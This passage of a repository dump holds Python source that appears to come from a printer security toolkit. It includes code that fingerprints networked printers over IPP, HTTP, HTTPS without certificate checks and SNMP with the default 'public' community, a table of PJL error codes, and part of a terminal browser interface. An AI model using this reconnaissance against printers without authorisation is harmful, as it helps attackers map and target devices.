\":631/\",\n                                   data=body, headers={'Content-type': 'application/ipp'})\n            response = request.content.decode()\n            # get name of device\n            # e.g. MDL:hp LaserJet 4250\n            model = item(re.findall(\"MDL:(.+?);\", response))\n            # get language support\n            # e.g. CMD:PCL,PJL,POSTSCRIPT\n            langs = item(re.findall(\"CMD:(.+?);\", response))\n            self.support = [_f for _f in [re.findall(\n                re.escape(pdl), langs, re.I) for pdl in lang] if _f]\n            self.set_support(model)\n            output().green(\"found\")\n        except Exception as e:\n            output().errmsg(\"not found\", e)\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # get capabilities via HTTP\n    def http(self, host):\n        try:\n            # poor man's way get http title\n            sys.stdout.write(\"Checking for HTTP support:        \")\n            html = requests.get(\"http://\" + host).text\n            # cause we are to parsimonious to import BeautifulSoup ;)\n            title = re.findall(\"<title.*?>\\n?(.+?)\\n?</title>\",\n                               html, re.I | re.M | re.S)\n            # get name of device\n            model = item(title)\n            # get language support\n            self.set_support(model)\n            output().green(\"found\")\n        except Exception as e:\n            output().errmsg(\"not found\", e)\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # get capabilities via HTTPS\n    def https(self, host):\n        try:\n            # poor man's way get https title\n            sys.stdout.write(\"Checking for HTTPS support:       \")\n            html = requests.get(\"https://\" + host, verify=False).text\n            # cause we are to parsimonious to import BeautifulSoup ;)\n            title = re.findall(\"<title.*?>\\n?(.+?)\\n?</title>\",\n                               html, re.I | re.M | re.S)\n            # get name of device\n            model = item(title)\n            # get language support\n            self.set_support(model)\n            output().green(\"found\")\n        except Exception as e:\n            output().errmsg(\"not found\", e)\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # get capabilities via SNMP\n    def snmp(self, host, lang):\n        try:\n            sys.stdout.write(\"Checking for SNMP support:        \")\n            # query device description and supported languages\n            # HOST-RESOURCES-MIB → hrDeviceDescr\n            desc, desc_oid = [], '1.3.6.1.2.1.25.3.2.1.3'\n            # Printer-MIB → prtInterpreterDescription\n            pdls, pdls_oid = [], '1.3.6.1.2.1.43.15.1.1.5.1'\n            error, error_status, idx, binds = cmdgen.CommandGenerator().nextCmd(\n                cmdgen.CommunityData('public', mpModel=0), cmdgen.UdpTransportTarget(\n                    (host, 161), timeout=self.timeout, retries=0), desc_oid, pdls_oid)\n            # exit on error\n            if error:\n                raise Exception(error)\n            if error_status:\n                raise Exception(error_status.prettyPrint())\n            # parse response\n            for row in binds:\n                for key, val in row:\n                    if desc_oid in str(key):\n                        desc.append(str(val))\n                    if pdls_oid in str(key):\n                        pdls.append(str(val))\n            # get name of device\n            model = item(desc)\n            # get language support\n            langs = ','.join(pdls)\n            self.support = [_f for _f in [re.findall(\n                re.escape(pdl), langs, re.I) for pdl in lang] if _f]\n            # self.set_support(model)\n            output().green(\"found\")\n        except NameError:\n            output().errmsg(\"not found\", \"pysnmp module not installed\")\n        except Exception as e:\n            output().errmsg(\"not found\", e)\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # feedback on language support\n\n    def feedback(self, support, lang):\n        sys.stdout.write(\"Checking for %-21s\" % (lang + \" support: \"))\n        if support:\n            output().green(\"found\")\n        else:\n            output().warning(\"not found\")\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # set language support\n    def set_support(self, model):\n        # model_stripped = re.sub(r'(\\d|\\s|-)[a-zA-Z]+$', '', model)\n        '''\n        ┌───────────────────────────────────────────────────────┐\n        │ Experimental -- This might introduce false positives! │\n        ├───────────────────────────────────────────────────────┤\n        │ The stripped down version of the model string removes │\n        │ endings like '-series', ' printer' (maybe localized), │\n        │ 'd' (duplex), 't' (tray), 'c' (color), 'n' (network). │\n        └───────────────────────────────────────────────────────┘\n        '''\n        self.support = [_f for _f in [re.findall(\n            re.escape(m), model, re.I) for m in self.models] if _f]\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # open database of supported devices\n    def get_models(self, file):\n        try:\n            with open(self.rundir + \"db\" + os.path.sep + file, 'r') as f:\n                models = [_f for _f in (line.strip() for line in f) if _f]\n            f.close()\n            return models\n        except IOError as e:\n            output().errmsg(\"Cannot open file\", e)\n            return []\n"
        },
        {
          "name": "codebook.py",
          "type": "blob",
          "size": 21.97265625,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# python standard library\nimport re\n\n\nclass codebook():\n\n    '''\n    ┌───────────────────────────────────────────────────┐\n    │                  PJL Error Codes                  │\n    ├───────────────────────────────────────────────────┤\n    │ 10xxx: Informational Messages                     │\n    │ 11xxx: Background Paper Mount                     │\n    │ 12xxx: Background Paper Tray Status               │\n    │ 15xxx: Output Bin Status                          │\n    │ 20xxx: PJL Parser Errors                          │\n    │ 25xxx: PJL Parser Warnings                        │\n    │ 27xxx: PJL Semantic Errors                        │\n    │ 30xxx: Auto-Continuable Conditions                │\n    │ 32xxx: PJL File System Errors                     │\n    │ 35xxx: Potential Operator Intervention Conditions │\n    │ 40xxx: Operator Intervention Required             │\n    │ 41xxx: Foreground Paper Mount                     │\n    │ 42xxx: Paper Jam Errors                           │\n    │ 43xxx: Optional Paper Handling Device Errors      │\n    │ 44xxx: Paper Jam Information                      │\n    │ 50xxx: Hardware Errors                            │\n    └───────────────────────────────────────────────────┘\n    '''\n\n    def get_errors(self, code):\n        return (self.codelist[key] for key in self.codelist if re.match(key, code))\n\n    codelist = {\n        # 10xxx: Informational Messages\n        '10001': \"READY (online)\",\n        '10002': \"READY (offline)\",\n        '10003': \"WARMING UP\",\n        '10004': \"SELF TEST\",\n        '10005': \"RESET, CLEARING MEMORY\",\n        '10006': \"TONER LOW\",\n        '10007': \"CANCELING JOB\",\n        '10010': \"STATUS BUFFER OVERFLOW\",\n        '10013': \"SELF TEST\",\n        '10011': \"INITIALIZING\",\n        '10014': \"PRINTING TEST\",\n        '10015': \"TYPEFACE LIST\",\n        '10016': \"ENGINE TEST\",\n        '10017': \"DEMO PAGE\",\n        '10018': \"MENU RESET\",\n        '10019': \"RESET ACTIVE I/O\",\n        '10020': \"RESET ALL I/O\",\n        '10021': \"COLD RESET\",\n        '10022': \"CONFIG PAGE\",\n        '10023': \"PROCESSING JOB\",\n        '10024': \"DATA RECEIVED\",\n        '10025': \"ACCESS DENIED\",\n        '10026': \"NO JOB TO CANCEL\",\n        '10027': \"CLEARING PAPER PATH\",\n        '10028': \"PRINTING ERROR LOG\",\n        '10029': \"FORMFEEDING\",\n        '10030': \"DISPLAY JOB MESSACE RECEIVED\",\n        '10031': \"ENGINE CLEANING\",\n\n        # 11xxx: Background Paper Mount\n        '11.00': \"Unknown Paper\",\n        '11.01': \"Unknown Envelope\",\n        '11.02': \"Letter Paper\",\n        '11.03': \"Legal Paper\",\n        '11.04': \"A4 Paper\",\n        '11.05': \"Executive Paper\",\n        '11.06': \"Ledger Paper\",\n        '11.07': \"A3 Paper\",\n        '11.08': \"COM10 Envelope\",\n        '11.09': \"Monarch Envelope\",\n        '11.10': \"C5 Envelope\",\n        '11.11': \"DL Envelope\",\n        '11.12': \"Japan B4 Paper\",\n        '11.13': \"Japan B5 Paper\",\n        '11.14': \"B5 Envelope\",\n        '11.15': \"Custom Media Paper\",\n        '11.16': \"J-Postcard\",\n        '11.17': \"J-RoundTrip Postcard\",\n        '11.18': \"A5 Paper\",\n        '11.19': \"Letter-R Paper\",\n        '11.20': \"A4-R Paper\",\n        '11.21': \"A5-R Paper\",\n        '11.22': \"Japan B5-R Paper\",\n        '11.23': \"Exec-R Paper\",\n        '11.24': \"A6 Paper\",\n        '11.25': \"Foolscap Paper\",\n        '11.26': \"Japan B6 Paper\",\n\n        # 12xxx: Background Paper Tray Status\n        '12.01': \"Tray Open\",\n        '12.02': \"Tray Lifting\",\n\n        # 15xxx: Output Bin Status\n        '15..1': \"Output Bin Full\",\n        '15..2': \"Output Bin Open\",\n        '15..3': \"Output Bin Broken\",\n\n        # 20xxx: PJL Parser Errors\n        '20001': \"Generic syntax error (entire PJL command ignored)\",\n        '20002': \"Unsupported command\",\n        '20004': \"Unsupported personality, system, or I/O port\",\n        '20005': \"PJL command buffer overflow\",\n        '20006': \"Illegal character or line terminated by the UEL\",\n        '20007': \"<WS> or [<CR>]<LF> missing after closing quotes\",\n        '20008': \"Invalid character in an alphanumeric value\",\n        '20009': \"Invalid character in a numeric value\",\n        '20010': \"Invalid character at the start of a string, alphanumeric value, or numeric value\",\n        '20011': \"String missing closing double-quote character\",\n        '20012': \"Numeric value starts with a decimal point\",\n        '20013': \"Numeric value does not contain any digits\",\n        '20014': \"No alphanumeric value after command modifier\",\n        '20015': \"Option name and equal sign encountered, but the value field is missing\",\n        '20016': \"More than one command modifier\",\n        '20017': \"Command modifier encountered after an option (command modifier must precede option)\",\n        '20018': \"Command not an alphanumeric value\",\n        '20019': \"Numeric value encountered when an alphanumeric value expected\",\n        '20020': \"String encountered when an alphanumeric value expected\",\n        '20021': \"Unsupported command modifier\",\n        '20022': \"Command modifier missing\",\n        '20023': \"Option missing\",\n        '20024': \"Extra data received after option name (used for commands like SET that limit the number of options supported)\",\n        '20025': \"Two decimal points in a numeric value\",\n        '20026': \"Invalid binary value\",\n\n        # 25xxx: PJL Parser Warnings\n        '25001': \"Generic warning error (part of the PJL command ignored)\",\n        '25002': \"PJL prefix missing\",\n        '25003': \"Alphanumeric value too long\",\n        '25004': \"String too long\",\n        '25005': \"Numeric value too long\",\n        '25006': \"Unsupported option name\",\n        '25007': \"Option name requires a value which is missing\",\n        '25008': \"Option name requires a value of a different type\",\n        '25009': \"Option name received with a value, but this option does not support values\",\n        '25010': \"Same option name received more than once\",\n        '25011': \"Ignored option name due to value underflow or overflow\",\n        '25012': \"Value for option experienced data loss due to data conversion (value truncated or rounded)\",\n        '25013': \"Value for option experienced data loss due to value being out of range; the value used was the closest supported limit\",\n        '25014': \"Value is of the correct type, but is out of range (value was ignored)\",\n        '25016': \"Option name received with an alphanumeric value, but this value is not supported\",\n        '25017': \"String empty, option ignored\",\n        '25018': \"A Universal Exit Language command was expected but not found\",\n\n        # 27xxx: PJL Semantic Errors\n        '27001': \"Generic semantic error\",\n        '27002': \"EOJ command encountered without a previously matching JOB command. An EOJ command does not have a matching JOB command if the number of valid EOJ commands received is greater than the number of valid JOB commands received.\",\n        '27003': \"Password protected—attempted to change NVRAM value when password is set and the job is not a secure PJL job.\",\n        '27004': \"Cannot modify the value of a read-only variable.\",\n        '27005': \"Can only use DEFAULT with this variable; cannot use SET.\",\n        '27006': \"Attempted to pass a NULL string to a command or command option that requires the string to contain at least one character.\",\n        '27007': \"Attempted to DEFAULT a variable which can only be SET.\",\n\n        # 30xxx: Auto-Continuable Conditions\n        '30010': \"STATUS BUFFER OVERFLOW\",\n        '30016': \"20 MEM OVERFLOW or 20 MEMORY OVERFLOW DATA LOST or 20 INSUFFICIENT MEMORY, PRESS GO KEY\",\n        '30017': \"21 PRINT OVERRUN or 21 PRINT OVERRUN DATA LOST or 21 PAGE TOO COMPLEX\",\n        '30018': \"40 ERROR or 40.1 HP MIO 1 ERROR or 40.2 HP MIO 2 ERROR or 40 SER IO ERROR\",\n        '30027': \"22 I/O CONFIG ERROR or 22 SER IO ERROR 22 HP MIO 1 IO ERROR CHECK SETUP or 22 HP MIO 2 IO ERROR CHECK SETUP or 22 PARALLEL IO ERROR CHECK SETUP\",\n        '30034': \"41.x ERROR or 41.3 PAPER ERROR\",\n        '30035': \"68 ERROR CHECK CONFIGURATION or 68 NVRAM ERROR, SETTINGS NOT SAVED or 68 ERROR\",\n        '30036': \"68 SERVICE or 68 NVRAM FULL CHECK CONFIGURATION or 68 NVRAM ERROR, SETTINGS NOT SAVED\",\n        '30072': \"49 REMOVE PAGE\",\n        '30076': \"PERSONALITY MEMORY OVERFLOW/ OUT OF MEMORY\",\n        '30094': \"41.1 GENERAL MISPRINT ERROR\",\n        '30095': \"41.2 BEAM DETECT MALFUNCTION\",\n        '30096': \"41.3 IMPROPER PAPER SIZE or 41.3 UNEXPECTED PAPER SIZE\",\n        '30097': \"41.4 NO VIDEO SYNC\",\n        '30098': \"41.5 NOISY VIDEO SYNC REQ SIGNAL\",\n        '30099': \"INVALID INPUT SOURCE\",\n        '30100': \"INVALID OUTPUT DESTINATION\",\n        '30101': \"BINDING AGENT OUT OF SUPPLIES\",\n        '30102': \"BINDING AGENT MEDIA MISALIGNMENT\",\n        '30103': \"BINDING AGENT MEDIA CAPACITY EXCEEDED\",\n        '30104': \"EXTERNAL INPUT DEVICE PAPER PATH ERROR\",\n        '30105': \"EXTERNAL OUTPUT DEVICE PAPER PATH ERROR\",\n        '30106': \"EXTERNAL INPUT DEVICE OPERATIONAL ERROR\",\n        '30107': \"EXTERNAL OUTPUT DEVICE OPERATIONAL ERROR\",\n        '30108': \"40 HP MIO ERROR, PRESS GO KEY\",\n        '30109': \"40 BAD SERIAL DATA FORMAT, PRESS GO KEY\",\n        '30110': \"22 HP MIO ERROR, PRESS GO KEY\",\n        '30111': \"22 PARALLEL IO ERROR, PRESS GO KEY\",\n        '30112': \"22 SERIAL IO ERROR, PRESS GO KEY\",\n        '30113': \"STOPPING CHECK LAST PAGE\",\n        '30114': \"PRESS SELECT TO CANCEL JOB\",\n        '30119': \"MEDIA FEED ERROR\",\n\n        # 32xxx: PJL File System Errors\n        '30000': \"General error\",\n        '30001': \"Volume not available\",\n        '30002': \"Disk full\",\n        '30003': \"File not found\",\n        '30004': \"No free file descriptors\",\n        '30005': \"Invalid number of bytes\",\n        '30006': \"File already exists\",\n        '30007': \"Illegal name\",\n        '30008': \"Can't delete root\",\n        '30009': \"File operation attempted on a directory\",\n        '30010': \"Directory operation attempted on a file\",\n        '30011': \"Not same volume\",\n        '30012': \"Read only\",\n        '30013': \"Directory full\",\n        '30014': \"Directory not empty\",\n        '30015': \"Bad disk\",\n        '30016': \"No label\",\n        '30017': \"Invalid parameter\",\n        '30018': \"No contiguous space\",\n        '30019': \"Can't change root\",\n        '30020': \"File Descriptor obsolete\",\n        '30021': \"Deleted\",\n        '30022': \"No block device\",\n        '30023': \"Bad seek\",\n        '30024': \"Internal error\",\n        '30025': \"Write only\",\n        '30026': \"Write protected\",\n        '30027': \"No filename\",\n        '30051': \"End of directory\",\n        '30052': \"No file system\",\n        '30053': \"No memory\",\n        '30054': \"Vol name out of range\",\n        '30055': \"Bad FS\",\n        '30056': \"Hardware failure\",\n\n        # 35xxx: Potential Operator Intervention Conditions\n        '35028': \"BAD MIO\",\n        '35029': \"W1 IMAGE ADAPT or IMAGE ASSIST or MEMORY LOW, PAGE SIMPLIFIED\",\n        '35030': \"WA JOB ALTERED\",\n        '35031': \"W2 INVALID PERS or REQUESTED LANGUAGE NOT AVAILABLE\",\n        '35032': \"WL WARNINGS LOST\",\n        '35037': \"W3 JOB ABORTED or CANCELING JOB or INSUFFICIENT MEMORY, JOB CLEARED\",\n        '35039': \"W9 JOB 600/LTR\",\n        '35040': \"W0 JOB 600/A4\",\n        '35041': \"W8 JOB 600/OFF\",\n        '35042': \"W7 JOB 300/LGL\",\n        '35043': \"W5 JOB 300/LTR\",\n        '35044': \"W6 JOB 300/A4\",\n        '35045': \"W4 JOB 300/OFF\",\n        '35073': \"WM CHK MEM CNFIG or MEMORY SETTINGS CHANGED\",\n        '35074': \"WM MEM CNFIG N/A\",\n        '35075': \"USER MAINTENANCE REQUESTED\",\n        '35076': \"WM personality MEM FULL or XXXX MEMORY FULL, STORED DATA LOST\",\n        '35078': \"Entered powersave mode (00 POWERSAVE) or POWERSAVE ON\",\n        '35081': \"WM JOB 300\",\n        '35082': \"WD DISK NOT INIT or Volume 0 NOT INIT (Volume 0 will be indicated as either DISK, FLASH, or RAMDISK as appropriate)\",\n        '35084': \"WM JOB 600/LGL\",\n        '35085': \"WM JOB 600/A3\",\n        '35086': \"WM JOB 600/11x17\",\n        '35087': \"WM JOB 300/A3\",\n        '35088': \"WM JOB 300/11x17\",\n        '35115': \"Volume 1 NOT INIT (Volume 1 is not initialized. Volume 1 will be indicated as either DISK, FLASH, or RAMDISK as appropriate)\",\n        '35117': \"Volume 2 NOT INIT (Volume 2 is not initialized. Volume 2 will be indicated as either DISK, FLASH, or RAMDISK as appropriate.)\",\n\n        # 40xxx: Operator Intervention Required\n        '40000': \"SLEEP MODE (STANDBY)\",\n        '40005': \"Cartridge error during align cartridges (or reading setup sheet—DesignJet)\",\n        '40010': \"14 NO EP CART or INSTALL TONER CARTRIDGE or no electrical contact with one or more ink cartridges (DesignJet)\",\n        '40011': \"Accessing ink cartridges (DesignJet)\",\n        '40019': \"REMOVE PAPER FROM [bin name]\",\n        '40020': \"NO MICR TONER or INSTALL MICR TONER CARTRIDGE\",\n        '40021': \"12 PRINTER OPEN OR NO EP CART or CLOSE PRINTER COVER (or lower lever or lower window—DesignJet)\",\n        '40022': \"13 PAPER JAM or REMOVE PAPER JAM\",\n        '40024': \"FE CARTRIDGE\",\n        '40026': \"PC INSTALL or INSTALL TRAY 2\",\n        '40038': \"16 LOW TONER or TONER LOW or TONER LOW, PRESS GO KEY\",\n        '40046': \"FI INSERT CART\",\n        '40047': \"FR REMOVE CART\",\n        '40048': \"[PJL OPMSG]\",\n        '40049': \"[PJL STMSG]\",\n        '40050': \"50 SERVICE or 50 FUSER ERROR, CYCLE POWER\",\n        '40051': \"51 ERROR or 51 PRINTER ERROR, CYCLE POWER\",\n        '40052': \"52 ERROR or 52 PRINTER ERROR, CYCLE POWER\",\n        '40053': \"53-xy-zz ERROR\",\n        '40054': \"54 ERROR\",\n        '40055': \"55 ERROR\",\n        '40056': \"56 ERROR\",\n        '40057': \"57 SERVICE or 57 MOTOR FAILURE, CALL SERVICE\",\n        '40058': \"58 SERVICE or FAN MOTOR FAILURE, CALL SERVICE\",\n        '40059': \"59 ERROR\",\n        '40061': \"61.x SERVICE\",\n        '40062': \"62.x SERVICE\",\n        '40063': \"63 SERVICE\",\n        '40064': \"64 SERVICE or PRINTER ERROR, CYCLE POWER\",\n        '40065': \"65 SERVICE\",\n        '40066': \"External paper handling device failure\",\n        '40067': \"67 SERVICE\",\n        '40068': \"69 SERVICE\",\n        '40069': \"70 ERROR\",\n        '40070': \"71 ERROR\",\n        '40071': \"72 SERVICE\",\n        '40079': \"PRINTER MANUALLY TAKEN OFFLINE or OFFLINE or FORMFEEDING or SERVICE MODE or 00 OFFLINE\",\n        '40080': \"EE INCOMPATIBLE or LC INCOMPATIBLE\",\n        '40083': \"FS DISK FAILURE or 311.1.1 DISK FAILURE or Volume 0 FAILURE (Volume 0 will be indicated as either DISK, FLASH, or RAMDISK as appropriate)\",\n        '40089': \"INCOMPLETE TRAY 3 INSTALLED\",\n        '40090': \"INCOMPATIBLE ENVELOPE FEEDER INSTALLED\",\n        '40092': \"81 SERVICE (XXX)\",\n        '40093': \"REMOVE DUPLEX JAM\",\n        '40096': \"41.3 UNEXPECTED PAPER SIZE CHECK PAPER IN TRAY\",\n        '40099': \"56.1 ERROR PRESS SELECT KEY\",\n        '40100': \"56.2 ERROR PRESS SELECT KEY\",\n        '40102': \"FINISHER ALIGN ERROR [BIN NAME]\",\n        '40103': \"FINISH LIMIT REACHED [BIN NAME]\",\n        '40104': \"INPUT DEVICE FEED PATH OPEN\",\n        '40105': \"OUTPUT DEVICE DELIVERY PATH OPEN\",\n        '40106': \"INPUT OPERATION ERROR X.YY\",\n        '40107': \"OUTPUT OPERATION ERROR X.YY\",\n        '40116': \"Volume 1 FAILURE (Failure on Volume 1. Volume 1 will be indicated as either DISK, FLASH, or RAMDISK as appropriate)\",\n        '40118': \"Volume 2 FAILURE (Failure on Volume 2. Volume 2 is indicated as either DISK, FLASH, or RAMDISK as appropriate.)\",\n        '40119': \"PAPER MISFEED\",\n        '40120': \"Open face-up output bin\",\n        '40121': \"Close face-up output bin\",\n        '40122': \"Duplexer must be installed\",\n        '40123': \"Duplexer error, remove duplexer\",\n        '40124': \"Bad duplexer connection\",\n        '40128': \"DRUM ERROR REPLACE DRUM KIT\",\n        '40129': \"DRUM LIFE OUT REPLACE DRUM KIT\",\n        '40130': \"DRUM LIFE LOW REPLACE DRUM KIT\",\n        '40131': \"TRANSFER KIT OUT REPLACE KIT\",\n        '40132': \"TRANSFER KIT LOW REPLACE KIT\",\n        '40141': \"WASTE TONER FULL REPLACE DRUM KIT\",\n        '40142': \"INSTALL DRUM KIT\",\n        '40143': \"REINSTALL TRANSFER BELT\",\n        '40144': \"PRESS GO TO PRINT PRESS SELECT TO CHANGE TONER\",\n        '40146': \"41.5 UNEXPECTED PAPER TYPE CHECK PAPER IN TRAY\",\n\n        # 41xxx: Foreground Paper Mount\n        '41.00': \"Unknown Paper\",\n        '41.01': \"Unknown Envelope\",\n        '41.02': \"Letter Paper\",\n        '41.03': \"Legal Paper\",\n        '41.04': \"A4 Paper\",\n        '41.05': \"Executive Paper\",\n        '41.06': \"Ledger Paper\",\n        '41.07': \"A3 Paper\",\n        '41.08': \"COM10 Envelope\",\n        '41.09': \"Monarch Envelope\",\n        '41.10': \"C5 Envelope\",\n        '41.11': \"DL Envelope\",\n        '41.12': \"Japan B4 Paper\",\n        '41.13': \"Japan B5 Paper\",\n        '41.14': \"B5 Envelope\",\n        '41.15': \"Custom Media Paper\",\n        '41.16': \"J-Postcard\",\n        '41.17': \"J-RoundTrip Postcard\",\n        '41.18': \"A5 Paper\",\n        '41.19': \"Letter-R Paper\",\n        '41.20': \"A4-R Paper\",\n        '41.21': \"A5-R Paper\",\n        '41.22': \"Japan B5-R Paper\",\n        '41.23': \"Exec-R Paper\",\n        '41.24': \"A6 Paper\",\n        '41.25': \"Foolscap Paper\",\n        '41.26': \"Japan B6 Paper\",\n\n        # 42xxx: Paper Jam Errors\n        '42.00': \"Non-specific jam\",\n        '42.01': \"Paper feed 1, paper late jam\",\n        '42.02': \"Paper feed 2, paper late jam\",\n        '42.03': \"Fuser output, paper late jam\",\n        '42.04': \"Fuser output, paper stopped jam\",\n        '42.05': \"Face down output, paper late jam\",\n        '42.06': \"Face down output, paper stopped jam\",\n        '42.07': \"2-Sided turn around, paper late jam\",\n        '42.08': \"2-Sided turn around, paper stopped jam\",\n        '42.09': \"2-Sided path, paper late jam\",\n        '42.10': \"2-Sided path, paper stopped jam\",\n        '42.11': \"External input device paper jam\",\n        '42.12': \"External output device paper jam\",\n        '42.13': \"Fuser accordion jam\",\n        '42.14': \"Fuser accordion jam\",\n        '42.15': \"Printer could not auto eject paper\",\n\n        # 43xxx: Optional Paper Handling Device Errors\n        '430.1': \"Unable to communicate with the PHC\",\n        '430.2': \"Out of sequence packet\",\n        '430.3': \"Bad transaction\",\n        '430.4': \"Invalid status bits\",\n        '430.5': \"Invalid status code\",\n        '430.6': \"Invalid device specified\",\n        '430.7': \"Invalid tray specified\",\n        '430.8': \"Invalid bin specified\",\n        '430.9': \"Invalid number of special purpose bytes\",\n        '43.10': \"Invalid number of NVEE bytes\",\n        '43.11': \"General PHC malfunction\",\n        '43.12': \"Bad PHC RAM\",\n        '43.13': \"PHC ROM checksum error\",\n        '43.14': \"Faulty PHC FIFO\",\n        '43.15': \"PHC cannot communicate with device(s)\",\n        '43.16': \"PHC never ready during initialization\",\n        '43.17': \"FIFO empty when expecting data\",\n        '43.18': \"FIFO full when tray to send data\",\n        '43.19': \"Invalid page ACK (formatter not expecting a page ACK)\",\n        '43.20': \"Page ACK timeout\",\n        '43.21': \"Inconsistent paper size\",\n        '43.22': \"Wrong page ACK\",\n        '43.23': \"Device(s) never ready during installation\",\n        '43.24': \"Negative ACK of ready tray\",\n\n        # 44xxx: Paper Jam Information\n        '44.00': \"Paper jam in unknown location\",\n        '44.01': \"Paper jam in the paper input area\",\n        '44.02': \"Paper jam in the paper output area (may need to open rear door of printer)\",\n        '44.03': \"Paper jam underneath the top cover. Remove toner cartridge to clear.\",\n        '44.04': \"Paper jam in the duplexer\",\n        '44.05': \"Paper jam in the duplex front cover area\",\n        '44.06': \"Paper jam in the face down output area\",\n        '44.07': \"Paper jam in the front door area\",\n\n        # 50xxx: Hardware Errors\n        '50000': \"General Hardware Failure\",\n        '50001': \"ROM or RAM Error, ROM Checksum Failed (or interface error [DesignJet])\",\n        '50002': \"RAM Error, RAM Test Failed (or part malfunction [DesignJet])\",\n        '50003': \"Engine Fuser Error\",\n        '50004': \"Engine Beam Detect Error\",\n        '50005': \"Engine Scanner Error\",\n        '50006': \"Engine Fan Error\",\n        '50007': \"Engine Communications Error\",\n        '50008': \"50.1 FUSER ERROR CYCLE POWER or LOW FUSER TEMPERATURE\",\n        '50009': \"50.2 FUSER ERROR CYCLE POWER or FUSER TOOK TOO LONG TO WARM UP\",\n        '50010': \"50.3 FUSER ERROR CYCLE POWER or FUSER TOO HOT\",\n        '50011': \"50.4 FUSER ERROR CYCLE POWER or BAD FUSER\",\n        '50012': \"51.1 ERROR PRESS SELECT KEY or BEAM DETECT MALFUNCTION\",\n        '50013': \"51.2 ERROR PRESS SELECT KEY or LASER MALFUNCTION\",\n        '50014': \"52.1 ERROR PRESS SELECT KEY or SCANNER STARTUP FAILURE\",\n        '50015': \"52.2 ERROR PRESS SELECT KEY or SCANNER ROTATION FAILURE\",\n        '50016': \"57.1 FAN FAILURE CALL SERVICE or FAN MOTOR 1 FAILURE\",\n        '50017': \"57.2 FAN FAILURE CALL SERVICE or FAN MOTOR 2 FAILURE\",\n        '50018': \"57.2 FAN FAILURE CALL SERVICE or FAN MOTOR 3 FAILURE\",\n        '50019': \"57.4 FAN FAILURE CALL SERVICE or FAN MOTOR 4 FAILURE\",\n        '50020': \"UPPER INPUT TRAY LIFTER MALFUNCTION\",\n        '50021': \"LOWER INPUT TRAY LIFTER MALFUNCTION\",\n        '50022': \"58.3 PRINTER ERROR CYCLE POWER or MULTIPURPOSE TRAY LIFTER MALFUNCTION\",\n        '50023': \"59.1 PRINTER ERROR CYCLE POWER or MAIN MOTOR STARTUP FAILURE\",\n        '50024': \"59.2 PRINTER ERROR CYCLE POWER or MAIN MOTOR ROTATION FAILURE\",\n        '50025': \"FINISHER MALFUNCTION [BIN NAME] or EXTERNAL BINDING DEVICE HAS A MALFUNCTION\",\n        '50026': \"DEVICE ERROR X.YY CYCLE POWER or AN EXTERNAL DEVICE HAS REPORTED A MALFUNCTION\",\n        '50027': \"DUPLEX ERROR CHECK DUPLEX UNIT or DUPLEX UNIT GUIDE FAILED AND REQUIRES SERVICE\",\n        '50028': \"55.XX ERROR PRESS SELECT KEY or COMMUNICATION FAILURE BETWEEN FORMATTER AND ENGINE\",\n        '50029': \"64 PRINTER ERROR CYCLE POWER or VIDEO DMA TRANSFER TIMED OUT\",\n        '50030': \"FAN MOTOR 5 FAILURE\",\n        '50031': \"FAN MOTOR 6 FAILURE\",\n        '50032': \"FAN MOTOR 7 FAILURE\",\n        '50033': \"FAN MOTOR 8 FAILURE\",\n        '505..': \"Firmware Error, Power Cycle\",\n        '50599': \"Processor Error, Power Cycle\"}\n"
        },
        {
          "name": "console.py",
          "type": "blob",
          "size": 11.2431640625,
          "content": "#!/usr/bin/env python3\nimport sys\nimport json\nimport curses\nimport npyscreen\n\n\nclass SearchDropdown(npyscreen.fmForm.Form):\n    DEFAULT_LINES = 7\n    DEFAULT_COLUMNS = 40\n    SHOW_ATX = 33\n    SHOW_ATY = 3\n\n\nclass FilterDropdown(npyscreen.fmForm.Form):\n    DEFAULT_LINES = 19\n    DEFAULT_COLUMNS = 17\n    SHOW_ATX = 33\n    SHOW_ATY = 4\n\n\nclass HelpMessage(npyscreen.fmForm.Form):\n    DEFAULT_LINES = 9\n    DEFAULT_COLUMNS = 45\n    SHOW_ATX = 33\n    SHOW_ATY = 4\n\n\nclass FilterButton(npyscreen.MiniButtonPress):\n\n    def whenPressed(self):\n        self.parent.parentApp.mainform.filter()\n\n    def h_exit_down(self, null):\n        self.parent.parentApp.mainform.name = 'Dictionary Browser'\n        super(FilterButton, self).h_exit_down(null)\n\n    h_exit_mouse = h_exit_down\n\n\nclass SearchButton(npyscreen.MiniButtonPress):\n\n    def whenPressed(self):\n        self.parent.parentApp.mainform.search()\n\n\nclass DictList(npyscreen.MLTree):\n\n    def filter_value(self, index):\n        return self._filter in ''.join(list(self._get_content(self.display_value(self.values[index])).values()))\n\n    def update(self, clear=False):\n        try:\n            self.h_select(self)\n            super(DictList, self).update()\n            c = self.values[self.cursor_line].get_content()\n            self.parent.parentApp.mainform.update_value(\n                c['value'], c['type'], c['perms'])\n            self.parent.parentApp.mainform.update_perms(c['perms'])\n        except:\n            pass\n\n    def set_up_handlers(self):\n        super(npyscreen.MLTree, self).set_up_handlers()\n        self.handlers.update({ord('<'): self.h_collapse_tree,\n                              ord('>'): self.h_expand_tree,\n                              ord('{'): self.h_collapse_all,\n                              ord('}'): self.h_expand_all})\n\n\nclass Dict(npyscreen.BoxTitle):\n    _contained_widget = DictList\n\n\nclass Perms(npyscreen.BoxTitle):\n    _contained_widget = npyscreen.MultiSelect\n\n\nclass ValueEdit(npyscreen.MultiLineEdit):\n\n    def adjust_widgets(self):\n        self.color = 'DANGER'\n        print('XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')\n\n\nclass Value(npyscreen.BoxTitle):\n    _contained_widget = ValueEdit\n\n\nclass TreeDataDump(npyscreen.TreeData):\n\n    def get_content_for_display(self):\n        return str(self.content['key'] + ': ' + self.content['value'])\n\n\nclass Browser(npyscreen.NPSAppManaged):\n\n    def onStart(self):\n        self.mainform = self.addForm('MAIN', MainForm)\n\n    def set_data(self, name, data):\n        self.name = name\n        self.data = data\n\n    def get_data(self):\n        treedata = TreeDataDump(content=self.name)\n        self.populate(treedata, 